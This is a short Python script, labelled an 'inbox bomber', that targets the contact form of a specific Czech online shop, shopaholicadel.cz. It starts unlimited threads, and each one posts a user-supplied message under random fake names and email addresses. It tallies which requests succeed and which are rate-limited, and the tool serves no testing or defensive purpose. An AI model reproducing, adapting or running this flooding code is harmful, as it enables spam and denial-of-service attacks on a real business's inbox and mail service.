"""
MIT License

Copyright (c) 2022 Xel Lu

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import requests
import random
import string
import os
import threading
import sys

class noErr: 
    def write(self, msg):
        pass

#sys.stderr = noErr()

sent,ratelimited,other = 0,0,0

def randomstr(length):
    return "".join(random.choice(string.ascii_letters) for x in range(length))

def post_request():
    global sent, ratelimited, other
    r = requests.post("http://www.shopaholicadel.cz/action/MailForm/SendEmail/", params={"formId": 1, "fullName": randomstr(10), "surname": "", "email": f"{randomstr(5)}@fotrmail.gg", "message": msg, "consents[]": 40})
    
    if r.status_code == 200: sent += 1
    elif r.status_code == 429: ratelimited += 1
    else: other += 1
    
    os.system(f"title S: {sent} - R: {ratelimited} O: {other}")

print("""                            _       _     _   
  __ _ _   _  __ _ _   _  | | __ _| |__ | |_ 
 / _` | | | |/ _` | | | | | |/ _` | '_ \| __|
| (_| | |_| | (_| | |_| |_| | (_| | |_) | |_ 
 \__, |\__,_|\__, |\__,_(_)_|\__, |_.__/ \__|
 |___/       |___/           |___/           
> shopaholicadel.cz inbox bomber""")
msg = input("msg> ")
print("""S> Sent\nR> Ratelimited\nO> Other""")
while True:
    threading.Thread(target=post_request).start()